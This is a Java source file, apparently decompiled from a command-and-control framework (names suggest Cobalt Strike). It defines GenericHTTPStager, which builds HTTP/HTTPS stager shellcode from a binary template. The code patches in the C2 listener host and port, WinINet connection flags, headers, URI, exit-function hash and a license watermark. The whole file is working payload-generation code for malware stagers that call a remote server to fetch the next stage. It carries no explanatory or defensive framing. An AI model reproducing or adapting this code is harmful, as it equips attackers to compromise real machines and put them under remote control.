package stagers;

import common.AssertUtils;
import common.CommonUtils;
import common.MudgeSanity;
import common.Packer;
import common.ScListener;
import java.io.IOException;
import java.io.InputStream;

public abstract class GenericHTTPStager extends GenericStager {
   public GenericHTTPStager(ScListener var1) {
      super(var1);
   }

   public String getHeaders() {
      return this.isForeign() ? "User-Agent: " + this.getConfig().getUserAgent() + "\r\n" : this.getConfig().getHTTPHeaders();
   }

   public int getStagePreamble() {
      return this.isForeign() ? 0 : (int)this.getConfig().getHTTPStageOffset();
   }

   public abstract String getURI();

   public abstract int getExitOffset();

   public abstract int getPortOffset();

   public abstract int getSkipOffset();

   public abstract int getFlagsOffset();

   public abstract String getStagerFile();

   public int getConnectionFlags() {
      int var1 = 0;
      var1 |= Integer.MIN_VALUE;
      var1 |= 67108864;
      var1 |= 512;
      var1 |= 4194304;
      if (this.isSSL()) {
         var1 |= 8388608;
         var1 |= 4096;
         var1 |= 8192;
      }

      if (this.getConfig().usesCookie()) {
         var1 |= 524288;
      }

      return var1;
   }

   public boolean isSSL() {
      return CommonUtils.isin("HTTPSStager", this.getClass().getName());
   }

   public boolean isForeign() {
      return this.getClass().getName().startsWith("stagers.Foreign");
   }

   public byte[] generate() {
      try {
         InputStream var1 = CommonUtils.resource(this.getStagerFile());
         byte[] var2 = CommonUtils.readAll(var1);
         String var3 = CommonUtils.bString(var2);
         var1.close();
         var3 = var3 + this.getListener().getStagerHost() + '\u0000';
         Packer var4 = new Packer();
         var4.little();
         var4.addShort(this.getListener().getPort());
         AssertUtils.TestPatchS(var2, 4444, this.getPortOffset());
         var3 = CommonUtils.replaceAt(var3, CommonUtils.bString(var4.getBytes()), this.getPortOffset());
         var4 = new Packer();
         var4.little();
         var4.addInt(1453503984);
         AssertUtils.TestPatchI(var2, 1453503984, this.getExitOffset());
         var3 = CommonUtils.replaceAt(var3, CommonUtils.bString(var4.getBytes()), this.getExitOffset());
         var4 = new Packer();
         var4.little();
         var4.addShort(this.getStagePreamble());
         AssertUtils.TestPatchS(var2, 5555, this.getSkipOffset());
         var3 = CommonUtils.replaceAt(var3, CommonUtils.bString(var4.getBytes()), this.getSkipOffset());
         var4 = new Packer();
         var4.little();
         var4.addInt(this.getConnectionFlags());
         AssertUtils.TestPatchI(var2, this.isSSL() ? -2069876224 : -2074082816, this.getFlagsOffset());
         var3 = CommonUtils.replaceAt(var3, CommonUtils.bString(var4.getBytes()), this.getFlagsOffset());
         String var5;
         if (CommonUtils.isin(CommonUtils.repeat("X", 303), var3)) {
            var5 = this.getConfig().pad(this.getHeaders() + '\u0000', 303);
            var3 = CommonUtils.replaceAt(var3, var5, var3.indexOf(CommonUtils.repeat("X", 127)));
         }

         int var6 = var3.indexOf(CommonUtils.repeat("Y", 79), 0);
         var5 = this.getConfig().pad(this.getURI() + '\u0000', 79);
         var3 = CommonUtils.replaceAt(var3, var5, var6);
         return CommonUtils.toBytes(var3 + this.getConfig().getWatermark());
      } catch (IOException var7) {
         MudgeSanity.logException("HttpStagerGeneric: " + this.getStagerFile(), var7, false);
         return new byte[0];
      }
   }
}
